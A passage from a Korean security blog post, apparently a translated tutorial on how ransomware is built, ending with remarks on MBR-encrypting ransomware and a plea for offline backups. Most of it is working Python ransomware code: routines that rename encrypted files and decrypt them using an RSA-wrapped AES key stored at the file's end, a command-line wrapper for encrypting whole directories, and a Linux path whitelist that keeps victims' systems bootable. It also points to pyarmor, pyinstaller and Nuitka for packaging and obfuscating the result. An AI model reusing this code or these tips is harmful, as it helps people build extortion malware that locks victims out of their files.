<li><p>&#xC554;&#xD638;&#xD654;&#xAC00; &#xB41C; &#xC9C0; &#xC2DD;&#xBCC4;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC774;&#xB984;&#xC744; &#xBC14;&#xAFBC;&#xB2E4;.</p>
 <pre><code class="hljs python">input_file.close()
  os.rename(file, file + <span class="hljs-string">&quot;.&quot;</span> + cryptoName)</code></pre>
</li>
</ol>
<p><img src="/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%205.png" srcset="/img/loading.gif" alt></p>
<blockquote>
<p>&#xC554;&#xD638;&#xD654; &#xD6C4; &#xB300;&#xB7B5;&#xC801;&#xC778; &#xD30C;&#xC77C; &#xAD6C;&#xC870;</p>
</blockquote>
<p>&#xC804;&#xCCB4; &#xD30C;&#xC77C;&#xC744; &#xBCF5;&#xC0AC;&#xD560; &#xD544;&#xC694;&#xAC00; &#xC5C6;&#xC5C8;&#xB358; &#xAC83;&#xC744; &#xC0DD;&#xAC01;&#xD574;&#xB77C;. file object&#xB97C; &#xD1B5;&#xD574; <code>seek()</code> &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xD0D0;&#xC0C9;&#xD558;&#xACE0; &#xBE60;&#xB974;&#xAC8C; &#xC791;&#xC5C5;&#xC744; &#xC9C4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC774;&#xB294; &#xBCF5;&#xD638;&#xD654; &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB3C4; &#xC0AC;&#xC6A9;&#xB41C;&#xB2E4;.</p>
<p>&#xB610; &#xC554;&#xD638;&#xD654;&#xB41C; &#xD30C;&#xC77C;&#xC5D0; AES IV&#xC640; &#xC554;&#xD638;&#xD654;&#xB41C; &#xD0A4;&#xB97C; &#xBAA8;&#xB450; &#xCD94;&#xAC00;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xAC01; &#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD55C; &#xD0A4;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xD14D;&#xC2A4;&#xD2B8; &#xD30C;&#xC77C;&#xC740; &#xD544;&#xC694; &#xC5C6;&#xB2E4;. victim&#xC740; &#xC6B0;&#xB9AC;&#xC5D0;&#xAC8C; &#xC5B4;&#xB5A4; &#xD30C;&#xC77C;&#xC774;&#xB4E0; &#xBCF4;&#xB0BC; &#xC218; &#xC788;&#xACE0; &#xD2B9;&#xC815;&#xD55C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; private key&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC73C;&#xBA74; &#xC6B0;&#xB9AC;&#xB294; &#xBCF5;&#xD638;&#xD654;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p>
<p><img src="/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%206.png" srcset="/img/loading.gif" alt></p>
<h1 id="SymDecryptFile"><a href="#SymDecryptFile" class="headerlink" title="SymDecryptFile"></a>SymDecryptFile</h1><p>&#xC8FC;&#xC694; &#xBCF5;&#xD638;&#xD654; &#xD568;&#xC218;&#xC774;&#xBA70; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xB3D9;&#xC791;&#xD55C;&#xB2E4;.</p>
<ol>
<li><p>privateKey&#xC640; file path&#xB97C; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD55C;&#xB2E4;.</p>
 <pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">symDecryptFile</span>(<span class="hljs-params">privateKey, file</span>):</span></code></pre>
</li>
<li><p>&#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD55C; decryption size(n &#xBC14;&#xC774;&#xD2B8;, &#xC554;&#xD638;&#xD654;&#xC5D0;&#xC11C; &#xC4F4; &#xAC83;&#xACFC; &#xB3D9;&#xC77C;)&#xB97C; &#xC815;&#xC758;&#xD574;&#xB77C;. &#xC608;&#xC2DC;&#xB294; 1MB&#xC774;&#xB2E4;.</p>
 <pre><code class="hljs python">buffer_size = <span class="hljs-number">1048576</span></code></pre>
</li>
<li><p>&#xD655;&#xC7A5;&#xC790;&#xB97C; &#xD1B5;&#xD574; &#xC554;&#xD638;&#xD654; &#xC5EC;&#xBD80;&#xB97C; &#xD655;&#xC778;&#xD55C;&#xB2E4;.</p>
 <pre><code class="hljs python"><span class="hljs-keyword">if</span> file.endswith(<span class="hljs-string">&quot;.&quot;</span> + cryptoName):
		out_filename = file[:-(len(cryptoName) + <span class="hljs-number">1</span>)]
		print(<span class="hljs-string">&quot;Decrypting file: &quot;</span> + file)
<span class="hljs-keyword">else</span> :
	print(<span class="hljs-string">&apos;File is not encrypted&apos;</span>)
	<span class="hljs-keyword">return</span></code></pre>
</li>
<li><p>&#xD30C;&#xC77C;&#xC744; &#xC5F4;&#xC5B4; AES IV(&#xB9C8;&#xC9C0;&#xB9C9; 16&#xBC14;&#xC774;&#xD2B8;)&#xB97C; &#xC77D;&#xC5B4;&#xC628;&#xB2E4;.</p>
 <pre><code class="hljs python">input_file = open(file, <span class="hljs-string">&apos;r+b&apos;</span>)

<span class="hljs-comment"># Read in the iv</span>
input_file.seek(<span class="hljs-number">-16</span>, os.SEEK_END)
iv = input_file.read(<span class="hljs-number">16</span>)</code></pre>
</li>
<li><p>&#xC554;&#xD638;&#xD654;&#xB41C; &#xBCF5;&#xD638;&#xD654; &#xD0A4;&#xB97C; &#xC77D;&#xC5B4;&#xC628;&#xB2E4;.</p>
 <pre><code class="hljs python"><span class="hljs-comment"># we move the pointer to 274 bbytes before the end of file</span>
<span class="hljs-comment"># (258 bytes of the encryption key + 16 of the AES IV)</span>
input_file.seek(<span class="hljs-number">-274</span>, os.SEEK_END)

<span class="hljs-comment"># And we read the 258 bytes of the key</span>
secret = input_file.read(<span class="hljs-number">258</span>)</code></pre>
</li>
<li><p>private key&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC554;&#xD638;&#xD654;&#xB41C; &#xD0A4;&#xB97C; &#xBCF5;&#xD638;&#xD654;&#xD55C;&#xB2E4;.</p>
 <pre><code class="hljs python">key = rsaDecryptSecret(cert, secret)</code></pre>
</li>
<li><p>&#xC774;&#xC804;&#xC5D0; &#xC815;&#xC758;&#xD55C; aes-encrypted buffer size&#xB97C; &#xBCF5;&#xD638;&#xD654;&#xD558;&#xACE0; &#xD30C;&#xC77C;&#xC758; &#xCCAB; &#xBD80;&#xBD84;&#xC5D0; &#xC791;&#xC131;&#xD55C;&#xB2E4;.</p>
 <pre><code class="hljs python"><span class="hljs-comment"># Create the cipher object</span>
cipher_encrypt = AES.new(privateKey, AES.MODE_CFB, iv=iv)

<span class="hljs-comment"># Read the encrypted header</span>
input_file.seek(<span class="hljs-number">0</span>)
buffer = input_file.read(buffer_size)

<span class="hljs-comment"># Decrypt the header with the key</span>
decrypted_bytes = cipher_encrypt.decrypt(buffer)

<span class="hljs-comment"># Write the decrypted text on the same file</span>
input_file.seek(<span class="hljs-number">0</span>)
input_file.write(decrypted_bytes)</code></pre>
</li>
<li><p>&#xD30C;&#xC77C;&#xC758; &#xB05D; &#xBD80;&#xBD84;&#xC5D0;&#xC11C; IV&#xC640; &#xC554;&#xD638;&#xD654;&#xB41C; &#xD0A4;&#xB97C; &#xC81C;&#xAC70;&#xD558;&#xACE0; &#xC774;&#xB984;&#xC744; &#xBCC0;&#xACBD;&#xD55C;&#xB2E4;.</p>
 <pre><code class="hljs python"><span class="hljs-comment"># Delete the last 274 bytes from IV + key.</span>
input_file.seek(<span class="hljs-number">-274</span>, os.SEEK_END)
input_file.truncate()
input_file.close()

<span class="hljs-comment"># Rename the file to delete the encrypted extenstion</span>
os.rename(file, out_filename)</code></pre>
</li>
</ol>
<h1 id="&#xB9C8;&#xC9C0;&#xB9C9;-&#xACE0;&#xB824;&#xC0AC;&#xD56D;"><a href="#&#xB9C8;&#xC9C0;&#xB9C9;-&#xACE0;&#xB824;&#xC0AC;&#xD56D;" class="headerlink" title="&#xB9C8;&#xC9C0;&#xB9C9; &#xACE0;&#xB824;&#xC0AC;&#xD56D;"></a>&#xB9C8;&#xC9C0;&#xB9C9; &#xACE0;&#xB824;&#xC0AC;&#xD56D;</h1><p>&#xBAA8;&#xB4E0; &#xD568;&#xC218; &#xC791;&#xC131;&#xC774; &#xB05D;&#xB098;&#xBA74; &#xC120;&#xD0DD;&#xD55C; &#xD3F4;&#xB354;&#xB97C; &#xC554;&#xD638;&#xD654;&#xD558;&#xAC70;&#xB098; &#xBCF5;&#xD638;&#xD654;&#xD560; &#xC218; &#xC788;&#xB294; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xB2E4;. &#xC815;&#xD655;&#xD558;&#xAC8C; <code>symEncryptDirectory/symDecryptDirectory</code> &#xD568;&#xC218;&#xB97C; &#xCF54;&#xB529;&#xD588;&#xC73C;&#xBA74; &#xC554;&#xD638;&#xD654;, &#xBCF5;&#xD638;&#xD654; &#xC911; &#xD558;&#xB098;&#xB97C; &#xC120;&#xD0DD;&#xD55C; &#xD6C4; <code>.pem</code> &#xD30C;&#xC77C;&#xC744; &#xC804;&#xB2EC;&#xD558;&#xAE30;&#xB9CC; &#xD558;&#xBA74; &#xB41C;&#xB2E4;. main &#xD638;&#xCD9C; &#xC804;&#xC5D0; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0; &#xC774;&#xAC83;&#xACFC; &#xBE44;&#xC2B7;&#xD55C; &#xAC83;&#xC774; &#xC788;&#xC744; &#xAC83;&#xC774;&#xB2E4;</p>
<pre><code class="hljs python">parser = argparse.ArgumentParser()
parser.add_argument(<span class="hljs-string">&quot;--dest&quot;</span>, <span class="hljs-string">&quot;-d&quot;</span>, help=<span class="hljs-string">&quot;File or directory to encrypt/decrypt&quot;</span>, dest=<span class="hljs-string">&quot;destination&quot;</span>, default=<span class="hljs-string">&quot;none&quot;</span>, required=<span class="hljs-literal">True</span>)
parser.add_argument(<span class="hljs-string">&quot;--action&quot;</span>, <span class="hljs-string">&quot;-a&quot;</span>, help=<span class="hljs-string">&quot;Action (encrypt/decrypt)&quot;</span>, dest=<span class="hljs-string">&quot;action&quot;</span>, required=<span class="hljs-literal">True</span>)
 
parser.add_argument(<span class="hljs-string">&quot;--pem&quot;</span>,<span class="hljs-string">&quot;-p&quot;</span>, help=<span class="hljs-string">&quot;Public/Private key&quot;</span>, dest=<span class="hljs-string">&quot;key&quot;</span>, required=<span class="hljs-literal">True</span>)</code></pre>
<p>&#xC624;&#xB958; &#xAC80;&#xC0AC;(&#xC554;&#xD638;&#xD654; &#xC791;&#xC5C5;&#xC5D0; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; public key&#xAC00; &#xC804;&#xB2EC;&#xB418;&#xB294;&#xC9C0;, decrypt&#xC5D0; private key&#xAC00; &#xC788;&#xB294;&#xC9C0; &#xB4F1;) &#xC678;&#xC5D0;&#xB3C4; &#xC6B4;&#xC601; &#xCCB4;&#xC81C;&#xC5D0; &#xB300;&#xD55C; &#xD30C;&#xC77C; &#xBC0F; &#xD3F4;&#xB354;&#xB97C; &#xD654;&#xC774;&#xD2B8; &#xB9AC;&#xC2A4;&#xD2B8;&#xB85C; &#xC9C0;&#xC815;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xC554;&#xD638;&#xD654;&#xB418;&#xB354;&#xB77C;&#xB3C4; &#xCEF4;&#xD4E8;&#xD130;&#xB294; &#xC0AC;&#xC6A9;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xB3C4;&#xB85D; &#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xBAA8;&#xB4E0; &#xD30C;&#xC77C;&#xC744; &#xC554;&#xD638;&#xD654;&#xD55C;&#xB2E4;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xACB0;&#xACFC;&#xB97C; &#xBCFC; &#xC218; &#xC788;&#xB2E4;.</p>
<ol>
<li>&#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xBB54;&#xAC00; &#xC798;&#xBABB;&#xB41C; &#xAC78; &#xC54C; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xCEF4;&#xD4E8;&#xD130; &#xC0AC;&#xC6A9;&#xC774; &#xBD88;&#xAC00;&#xB2A5;&#xD574;&#xC9C4;&#xB2E4;.</li>
<li>&#xC804;&#xBD80; &#xC554;&#xD638;&#xD654;&#xB41C; &#xD6C4;, &#xC2DC;&#xC2A4;&#xD15C;&#xC774; &#xBD80;&#xD305;&#xC774; &#xC548;&#xB418;&#xACE0; &#xC0AC;&#xC6A9;&#xC790;&#xB294; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xC5D0; &#xAC10;&#xC5FC;&#xB41C; &#xC0AC;&#xC2E4;&#xC744; &#xC54C;&#xC9C0; &#xBABB;&#xD55C;&#xB2E4;.</li>
</ol>
<p>&#xC608;&#xC2DC;&#xB85C; &#xB9AC;&#xB205;&#xC2A4; &#xD654;&#xC774;&#xD2B8; &#xB9AC;&#xC2A4;&#xD2B8;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xB2E4;.</p>
<pre><code class="hljs ini"><span class="hljs-attr">whitelist</span> = [<span class="hljs-string">&quot;/etc/ssh&quot;</span>, <span class="hljs-string">&quot;/etc/pam.d&quot;</span>, <span class="hljs-string">&quot;/etc/security/&quot;</span>, <span class="hljs-string">&quot;/boot&quot;</span>,
<span class="hljs-string">&quot;/run&quot;</span>, <span class="hljs-string">&quot;/usr&quot;</span>, <span class="hljs-string">&quot;/snap&quot;</span>, <span class="hljs-string">&quot;/var&quot;</span>, <span class="hljs-string">&quot;/sys&quot;</span>, <span class="hljs-string">&quot;/proc&quot;</span>, <span class="hljs-string">&quot;/dev&quot;</span>, <span class="hljs-string">&quot;/bin&quot;</span>,
<span class="hljs-string">&quot;/sbin&quot;</span>, <span class="hljs-string">&quot;/lib&quot;</span>, <span class="hljs-string">&quot;passwd&quot;</span>, <span class="hljs-string">&quot;shadow&quot;</span>, <span class="hljs-string">&quot;known_hosts&quot;</span>, <span class="hljs-string">&quot;sshd_config&quot;</span>,
<span class="hljs-string">&quot;/home/sec/.viminfo&quot;</span>, <span class="hljs-string">&apos;/etc/crontab&apos;</span>, <span class="hljs-string">&quot;/etc/default/locale&quot;</span>, <span class="hljs-string">&quot;/etc/environment&quot;</span>]</code></pre>
<p><code>.py</code> &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xBAA8;&#xB4E0; dependency&#xC640; &#xD568;&#xAED8; &#xC555;&#xCD95;&#xD558;&#xC5EC; &#xB2E8;&#xC77C; &#xC2E4;&#xD589; &#xD30C;&#xC77C;&#xB85C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xB2E4;. &#xC77C;&#xC77C;&#xC774; &#xC54C;&#xB824;&#xC8FC;&#xC9C4; &#xC54A;&#xACA0;&#xC9C0;&#xB9CC; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://pypi.org/project/pyarmor/">pyarmor</a>&#xC640; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.pyinstaller.org/">pyinstaller</a>&#xB97C; &#xCC3E;&#xC544;&#xBCF4;&#xBA74; &#xB41C;&#xB2E4;. &#xB610; &#xC0AC;&#xC6A9;&#xD558;&#xB824;&#xB294; &#xB09C;&#xB3C5;&#xD654;&#xC5D0; &#xB530;&#xB77C;&#xC11C; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/Nuitka/Nuitka">Nuitka</a>&#xAC00; &#xB3C4;&#xC6C0;&#xC774; &#xB420; &#xC218;&#xB3C4; &#xC788;&#xB2E4;.</p>
<h1 id="&#xB2E4;&#xB978;-&#xC885;&#xB958;&#xC758;-&#xB79C;&#xC12C;&#xC6E8;&#xC5B4;-MBR-&#xC554;&#xD638;&#xD654;"><a href="#&#xB2E4;&#xB978;-&#xC885;&#xB958;&#xC758;-&#xB79C;&#xC12C;&#xC6E8;&#xC5B4;-MBR-&#xC554;&#xD638;&#xD654;" class="headerlink" title="&#xB2E4;&#xB978; &#xC885;&#xB958;&#xC758; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;(MBR &#xC554;&#xD638;&#xD654;)"></a>&#xB2E4;&#xB978; &#xC885;&#xB958;&#xC758; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;(MBR &#xC554;&#xD638;&#xD654;)</h1><p>&#xC6B0;&#xB9AC;&#xAC00; &#xC0B4;&#xD3B4;&#xBCF4;&#xC9C0; &#xC54A;&#xC740; &#xB4DC;&#xB77C;&#xC774;&#xBE0C;&#xC758; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://en.wikipedia.org/wiki/Master_boot_record">Master Boot Record</a>&#xB97C; &#xAC10;&#xC5FC;&#xC2DC;&#xD0A4;&#xB294; &#xB2E4;&#xB978; &#xC885;&#xB958;&#xC758; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xAC00; &#xC788;&#xB2E4;. &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; NTFS &#xD30C;&#xC77C; &#xD14C;&#xC774;&#xBE14;&#xC744; &#xC554;&#xD638;&#xD654;&#xD558;&#xB294; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xC5EC; &#xB514;&#xC2A4;&#xD06C;&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC5C6;&#xAC8C; &#xB9CC;&#xB4E0;&#xB2E4;. &#xC774; &#xBC29;&#xBC95;&#xC740; &#xB370;&#xC774;&#xD130;&#xC758; &#xC791;&#xC740; &#xBD80;&#xBD84;&#xB9CC; &#xC554;&#xD638;&#xD654;&#xD558;&#xBA74; &#xB3FC;&#xC11C; &#xB9E4;&#xC6B0; &#xBE60;&#xB974;&#xB2E4;. <a target="_blank" rel="external nofollow noopener noreferrer" href="https://en.wikipedia.org/wiki/Petya_(malware">Petya &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;</a>)&#xAC00; &#xC774; &#xC885;&#xB958;&#xC758; &#xC644;&#xBCBD;&#xD55C; &#xC608;&#xC2DC;&#xC774;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xB294; 3&#xAC1C;&#xC758; &#xC8FC;&#xC694;&#xD55C; &#xB2E8;&#xC810;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB2E4;.</p>
<p>&#xCCAB; &#xBC88;&#xC9F8;&#xB85C; OS&#xB97C; &#xBD80;&#xD305;&#xD560; &#xC218; &#xC5C6;&#xC5B4;&#xB3C4; &#xD3EC;&#xB80C;&#xC2DD; &#xBD84;&#xC11D;&#xC744; &#xD1B5;&#xD574; &#xD30C;&#xC77C;&#xC744; &#xBCF5;&#xAD6C;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xD30C;&#xC77C;&#xB4E4;&#xC740; &#xC0AD;&#xC81C;&#xB418;&#xC9C0; &#xC54A;&#xACE0; &#xD30C;&#xC77C; &#xD14C;&#xC774;&#xBE14;&#xC5D0;&#xC11C; &#xCC38;&#xC870;&#xB418;&#xC9C0; &#xC54A;&#xC744; &#xB420; &#xBFD0;&#xC774;&#xB2E4;. &#xCEF4;&#xD4E8;&#xD130;&#xAC00; &#xC7AC;&#xBD80;&#xD305; &#xB41C; &#xD6C4;&#xC5D0; raw data&#xB97C; &#xC554;&#xD638;&#xD654; &#xD558;&#xB354;&#xB77C;&#xB3C4; victim&#xC774; &#xCEF4;&#xD4E8;&#xD130;&#xB97C; &#xB044;&#xACE0; &#xB514;&#xC2A4;&#xD06C;&#xB97C; &#xBE7C;&#xBC84;&#xB9AC;&#xBA74; &#xC77C;&#xBD80; &#xD30C;&#xC77C;&#xC744; &#xBCF5;&#xAD6C;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p>
<p>&#xB450; &#xBC88;&#xC9F8; &#xB2E8;&#xC810;&#xC740; &#xB300;&#xBD80;&#xBD84; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.howtogeek.com/193669/whats-the-difference-between-gpt-and-mbr-when-partitioning-a-drive/">&#xCD5C;&#xC2E0; OS&#xB294; GPT(GUID Partition Table)&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; MBR&#xC744; &#xB354; &#xC774;&#xC0C1; &#xC4F0;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;</a>&#xB294; &#xAC83;&#xC774;&#xB2E4;.</p>
<p>&#xC138; &#xBC88;&#xC9F8; &#xB2E8;&#xC810;&#xC740; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C; &#xC758;&#xC874;&#xC131;&#xC774; &#xB192;&#xACE0; NTFS&#xCC98;&#xB7FC; &#xB3D9;&#xC791;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;(EXT3/EXT4, ZFS &#xB4F1;)&#xB3C4; &#xACE0;&#xB824;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC218;&#xC815;&#xD574;&#xC57C; &#xD55C;&#xB2E4;&#xB294; &#xC810;&#xC774;&#xB2E4;.</p>
<p>&#xC774; &#xBC29;&#xBC95;&#xC740; &#xB354; &#xB9CE;&#xC740; low-level technical concept&#xC744; &#xC694;&#xAD6C;&#xD558;&#xC5EC; &#xC774; &#xAC8C;&#xC2DC;&#xAE00;&#xC5D0;&#xC11C; &#xB9CE;&#xC774; &#xC124;&#xBA85;&#xD558;&#xACE0; &#xC2F6;&#xC9C0; &#xC54A;&#xB2E4;. &#xB610;&#xD55C; &#xC774; &#xBC29;&#xBC95;&#xB860;&#xC740; &#xB9CE;&#xC774; &#xC0AC;&#xC6A9;&#xB418;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;. &#xD544;&#xC790;&#xC758; &#xC8FC;&#xBAA9;&#xC801;&#xC740; &#xC77C;&#xBC18;&#xC801;&#xC778; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xC5D0; &#xB300;&#xD574; &#xB3C5;&#xC790;&#xB4E4;&#xC774; &#xB354; &#xC798; &#xC774;&#xD574;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4;.</p>
<h1 id="&#xACB0;&#xB860;"><a href="#&#xACB0;&#xB860;" class="headerlink" title="&#xACB0;&#xB860;"></a>&#xACB0;&#xB860;</h1><p>&#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xB97C; &#xBC29;&#xC9C0;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xB4E4;(&#xCD9C;&#xCC98;&#xB97C; &#xC54C; &#xC218; &#xC5C6;&#xB294; &#xD30C;&#xC77C; &#xC5F4;&#xC9C0; &#xB9D0;&#xAE30;, &#xC778;&#xD504;&#xB77C; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xC720;&#xC9C0;, &#xC548;&#xD2F0; &#xBA40;&#xC6E8;&#xC5B4; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xB4F1;&#xB4F1;) &#xC678;&#xC5D0;&#xB3C4; &#xCD94;&#xCC9C;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xBC31;&#xC5C5;&#xACFC; &#xBC31;&#xC5C5; &#xADF8;&#xB9AC;&#xACE0; &#xB610; &#xBC31;&#xC5C5;&#xC774;&#xB2E4;. &#xACF5;&#xACA9;&#xC744; &#xB9C9;&#xAE30; &#xC704;&#xD55C; &#xB9CE;&#xC740; &#xC870;&#xC5B8;&#xC744; &#xB4E3;&#xAC8C; &#xB418;&#xACA0;&#xC9C0;&#xB9CC; &#xD544;&#xC790;&#xC758; &#xC0DD;&#xAC01;&#xC5D0;&#xB294; &#xADF8;&#xB0E5; &#xAC78;&#xB9B4; &#xAC70;&#xB77C; &#xC0DD;&#xAC01;&#xD558;&#xACE0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC624;&#xD504;&#xB77C;&#xC778; &#xBC31;&#xC5C5;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4;.</p>
<p><img src="/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%207.png" srcset="/img/loading.gif" alt></p>
<p>&#xB2F9;&#xC2E0;&#xC774; &#xAC10;&#xC5FC;&#xC744; &#xD53C;&#xD55C;&#xB2E4; &#xD574;&#xB3C4; &#xB3D9;&#xB8CC; &#xC9C1;&#xC6D0;&#xC774; &#xAC78;&#xB9AC;&#xBA74; &#xB9E4;&#xD551;&#xB41C; &#xACF5;&#xC720; &#xB4DC;&#xB77C;&#xC774;&#xBE0C;&#xC758; &#xBAA8;&#xB4E0; &#xD30C;&#xC77C;&#xC774; &#xC554;&#xD638;&#xD654; &#xB420; &#xAC83;&#xC774;&#xB2E4;.</p>
<blockquote>
<p>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; &#xC544;&#xBB34;&#xB3C4; &#xCD94;&#xCC9C;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xBC29;&#xBC95;: &#xAC10;&#xC5FC;&#xB41C; &#xACBD;&#xC6B0;, &#xC554;&#xD638;&#xD654;&#xB41C; &#xD30C;&#xC77C;(&#xAC00;&#xC871;&#xC0AC;&#xC9C4;, &#xBE44;&#xB514;&#xC624; &#xB4F1;)&#xC744; &#xBC14;&#xB85C; &#xBCF5;&#xAD6C;&#xD560; &#xD544;&#xC694;&#xAC00; &#xC5C6;&#xC73C;&#xBA74; &#xC554;&#xD638;&#xD654;&#xB41C; &#xD30C;&#xC77C;&#xC758; &#xBCF5;&#xC0AC;&#xBCF8;&#xC744; &#xBCF4;&#xAD00;&#xD574;&#xB77C;. &#xBA40;&#xC6E8;&#xC5B4; &#xAC1C;&#xBC1C;&#xC790;&#xAC00; &#xC740;&#xD1F4;(Shade, TeslaCrypt, HildaCrypt)&#xD558;&#xAC70;&#xB098; &#xCCB4;&#xD3EC;(CoinVault)&#xB418;&#xAC70;&#xB098; &#xACBD;&#xC7C1;&#xC790;&#xC758; &#xD0A4;&#xB97C; &#xBC30;&#xD3EC;(Petya vs Chimera)&#xD558;&#xB294; &#xB4F1; &#xD574;&#xB3C5; &#xD0A4;&#xAC00; &#xACF5;&#xAC1C;&#xB420; &#xC218; &#xC788;&#xB2E4;. &#xC6B4; &#xC88B;&#xC73C;&#xBA74; &#xBA87; &#xB2EC; &#xC548;&#xC5D0; &#xBCF5;&#xAD6C;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p>
</blockquote>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                <div class="post-meta mr-3">
                  <i class="iconfont icon-category"></i>
                  
                  <a class="hover-with-bg" href="/categories/Translation/">Translation</a>
                  
                </div>
                
                
                <div class="post-meta">
                  <i class="iconfont icon-tags"></i>
                  
                  <a class="hover-with-bg" href="/tags/malware/">malware</a>
                  
                  <a class="hover-with-bg" href="/tags/idioth/">idioth</a>
                  
                  <a class="hover-with-bg" href="/tags/ransomware/">ransomware</a>
                  
                  <a class="hover-with-bg" href="/tags/crypto/">crypto</a>
                  
                </div>
                
              </div>

              <div class="post-metas mb-3">
                <a class="hover-with-bg" style="display: flex;" href="/author">
                  <div class="link-avatar-page">
                    <img src="/img/profile_idioth.jpg" srcset="/img/loading.gif" alt="idioth">
                  </div>

                  <div class="link-text">
                    <div class="link-title">idioth</div>
                  </div>
                </a>
                <div class="link-text">
                  <div class="link-more">
                    <a href="/tags/idioth">
                      Read more
                      <i class="iconfont icon-arrowdown"></i>
                    </a>
                  </div>
                </div>
              </div>

              <hr>

              <script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
              
              <!--  -->
              <p class="note note-warning">  <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.ko" rel="external nofollow noopener noreferrer">CC BY-SA 4.0</a>  .        .</p>
              
              
              
              <div class="post-prevnext row">
                <article class="post-prev col-6">
                  
                  
                  <a href="/2021/04/26/idioth/2021-04-26/">
                    <i class="iconfont icon-arrowleft"></i>
                    <span class="hidden-mobile">[] Full VM escape Parallels Desktop on Intel and M1</span>
                    <span class="visible-mobile">Previous</span>
                  </a>
                  
                </article>
                <article class="post-next col-6">
                  
                  
                  <a href="/2021/04/24/fabu1ous/2021-04-24/">
                    <span class="hidden-mobile">[] CVE-2021-20226: Linux kernel Reference counting bug</span>
                    <span class="visible-mobile">Next</span>
                    <i class="iconfont icon-arrowright"></i>
                  </a>
                  
                </article>
              </div>
              
            </div>
            
            <!-- Embed Section -->
            <div style="width: 100%; height: 210px; margin-bottom: 50px; overflow: hidden;">
              <iframe src="https://maily.so/hackyboiz/embed?src=embed" style="width: 100%; height: 100%; border: none;" frameborder="0"></iframe>
            </div>            

            
            <!-- Comments -->
            <article class="comments" id="comments">
              
              
  <div class="disqus" style="width:100%">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
      var disqus_config = function () {
        this.page.url = 'https://hackyboiz.github.io/2021/04/25/idioth/arch_of_ransomware_part2/';
        this.page.identifier = '/2021/04/25/idioth/arch_of_ransomware_part2/';
      };
      function loadDisqus() {
        (function () {
